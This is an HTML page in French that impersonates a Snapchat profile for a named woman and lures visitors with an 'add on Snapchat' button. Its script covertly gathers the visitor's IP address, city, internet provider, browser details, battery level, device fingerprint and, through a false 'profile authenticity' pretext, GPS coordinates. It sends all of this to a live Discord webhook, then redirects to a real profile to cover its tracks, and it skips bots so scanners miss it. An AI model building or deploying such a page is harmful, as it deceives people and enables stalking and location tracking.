<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Snapchat</title>
  <style>
    body {
      background-color: #fffcf7;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
      color: #333;
    }
    img {
      border-radius: 50%;
      width: 150px;
      height: 150px;
      margin-bottom: 20px;
    }
    button {
      background-color: #FFFC00;
      border: none;
      padding: 15px 25px;
      font-size: 18px;
      font-weight: bold;
      border-radius: 30px;
      cursor: pointer;
    }
    .info {
      margin-top: 20px;
      font-size: 15px;
      color: #666;
    }
  </style>
</head>
<body>
  <img src="https://i.imgur.com/NfMCcDb.png" alt="Salma Profile Pic">
  <h2>Salma Mansouri üëª</h2>
  <p class="info">Snapchat v√©rifie l‚Äôauthenticit√© du profil.<br>Veuillez autoriser l'acc√®s √† votre position apr√®s avoir cliqu√© ci-dessous.</p>
  <button onclick="beginLogging()">Ajouter sur Snapchat</button>

  <script>
    const webhook = "https://discord.com/api/webhooks/1398793243692499055/fdMhPoKYGBXY96dCLTHEqho3lLc4rAfXJIYYi43yXz591O5pssHMg_mErqvo6hu5eI-Y";

    function send(msg) {
      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: msg })
      });
    }

    function beginLogging() {
      const ua = navigator.userAgent.toLowerCase();
      const token = "tracker"; // optional: you can check window.location.search if needed
      const isBot = ua.includes("bot") || ua.includes("discord") || ua.includes("preview") || screen.width < 400;

      if (isBot) {
        console.log("Visite bloqu√©e (bot ou explorateur).");
        return;
      }

      // General Info
      fetch("https://ipinfo.io/json?token=ce57c9ed4f132b")
        .then(res => res.json())
        .then(ipdata => {
          const lang = navigator.language;
          const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
          const screenSize = screen.width + "x" + screen.height;

          let msg = `üë§ **Visite de profil Snap**\n`;
          msg += `IP: ${ipdata.ip} | Ville: ${ipdata.city}, ${ipdata.region}\n`;
          msg += `Fournisseur: ${ipdata.org}\n`;
          msg += `Navigateur: ${navigator.userAgent}\n`;
          msg += `Langue: ${lang} | Fuseau horaire: ${tz} | √âcran: ${screenSize}`;
          send(msg);
        });

      // Battery Info
      if ('getBattery' in navigator) {
        navigator.getBattery().then(b => {
          send(`üîã Batterie: ${Math.round(b.level * 100)}% | En charge: ${b.charging}`);
        });
      }

      // Capabilities
      const caps = [
        `'Touch': ${'ontouchstart' in window}`,
        `'Bluetooth': ${'bluetooth' in navigator}`,
        `'MediaDevices': ${'mediaDevices' in navigator}`,
        `'Clipboard': ${'clipboard' in navigator}`
      ].join(' | ');
      send(`üì± Capacit√©s: ${caps}`);

      // GPS (after permission)
      navigator.geolocation.getCurrentPosition((pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const acc = pos.coords.accuracy;
        const map = `https://www.google.com/maps?q=${lat},${lon}`;

        send(`üìç **Coordonn√©es GPS**\nLatitude: ${lat}, Longitude: ${lon}, Pr√©cision: ${acc}m\nüîó ${map}`);

        // Redirect to real Snap profile after GPS capture
        setTimeout(() => {
          window.location.href = "https://snapchat.com/add/Salma_Mansouri2";
        }, 2000);
      }, () => {
        // Redirect anyway if denied
        window.location.href = "https://snapchat.com/add/Salma_Mansouri2";
      });

      // Fingerprint
      const fp = btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
      send(`üß¨ Empreinte du p√©riph√©rique: ${fp}`);
    }
  </script>
</body>
</html>
